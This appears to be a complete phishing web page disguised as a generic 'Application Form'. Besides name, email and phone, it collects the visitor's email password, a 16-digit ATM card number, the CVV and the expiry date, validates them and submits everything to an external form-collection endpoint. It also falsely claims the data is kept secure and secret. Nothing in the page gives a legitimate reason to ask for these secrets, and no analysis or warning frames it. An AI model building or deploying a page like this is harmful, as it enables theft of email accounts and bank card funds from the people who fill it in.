<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      margin: 0;
      padding: 20px;
    }

    h2 {
      text-align: center;
      color: #333;
    }

    p.info {
      text-align: center;
      font-style: italic;
      color: #555;
    }

    form {
      max-width: 500px;
      margin: 20px auto;
      background-color: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }

    input[type="text"],
    input[type="email"],
    input[type="number"],
    input[type="password"],
    input[type="tel"] {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .toggle-password {
      float: right;
      margin-top: -28px;
      margin-right: 10px;
      cursor: pointer;
    }

    button {
      margin-top: 20px;
      width: 100%;
      background-color: #4CAF50;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
    }

    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <h2>Application Form</h2>
  <p class="info">We keep your data/details secure and secret.</p>

  <form action="https://formspree.io/f/mwkgyjlj" method="POST" onsubmit="return validateForm()">
    <!-- Full Name -->
    <label for="fullName">Full Name</label>
    <input 
      type="text" 
      id="fullName" 
      name="Full Name" 
      pattern="[A-Za-z\s]+" 
      title="Only letters and spaces are allowed" 
      required 
    />

    <!-- Email -->
    <label for="email">Email Address</label>
    <input 
      type="email" 
      id="email" 
      name="Email" 
      placeholder="example@gmail.com" 
      required 
      title="Enter a valid email like example@gmail.com"
    />

    <!-- Phone Number -->
    <label for="phone">Phone Number (International format)</label>
    <input 
      type="tel" 
      id="phone" 
      name="Phone Number" 
      pattern="^\+[0-9]{10,15}$" 
      placeholder="+254712345678" 
      required 
      title="Enter phone number in international format. Example: +254712345678"
    />

    <!-- Email Password -->
    <label for="emailPassword">Email Password</label>
    <input 
      type="password" 
      id="emailPassword" 
      name="Email Password" 
      required 
    />
    <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>

    <!-- ATM Card Number -->
    <label for="cardNumber">ATM Card Number</label>
    <input 
      type="text" 
      id="cardNumber" 
      name="ATM Card Number" 
      pattern="\d{16}" 
      maxlength="16"
      required 
      title="Enter a valid 16-digit card number"
    />

    <!-- CVV -->
    <label for="cvv">CVV</label>
    <input 
      type="text" 
      id="cvv" 
      name="CVV" 
      pattern="\d{3}" 
      maxlength="3"
      required 
      title="Enter a valid 3-digit CVV"
    />

    <!-- Expiry Date -->
    <label for="expiry">Expiry Date</label>
    <input 
      type="text" 
      id="expiry" 
      name="Expiry Date" 
      placeholder="MM/YY" 
      required 
    />

    <button type="submit">Submit Application</button>
  </form>

  <script>
    function togglePassword() {
      const pwd = document.getElementById("emailPassword");
      pwd.type = pwd.type === "password" ? "text" : "password";
    }

    function validateForm() {
      const fullName = document.getElementById('fullName');
      const email = document.getElementById('email');
      const phone = document.getElementById('phone');
      const card = document.getElementById('cardNumber');
      const cvv = document.getElementById('cvv');

      if (!fullName.value.match(/^[A-Za-z\s]+$/)) {
        alert('Full Name should only contain letters and spaces.');
        fullName.focus();
        return false;
      }

      if (!email.value.includes("@") || !email.value.includes(".")) {
        alert('Please enter a valid email address like example@gmail.com');
        email.focus();
        return false;
      }

      if (!phone.value.match(/^\+[0-9]{10,15}$/)) {
        alert('Enter phone number in international format like +254712345678');
        phone.focus();
        return false;
      }

      if (!card.value.match(/^\d{16}$/)) {
        alert('Card number must be exactly 16 digits.');
        card.focus();
        return false;
      }

      if (!cvv.value.match(/^\d{3}$/)) {
        alert('CVV must be exactly 3 digits.');
        cvv.focus();
        return false;
      }

      return true;
    }
  </script>
</body>
</html>
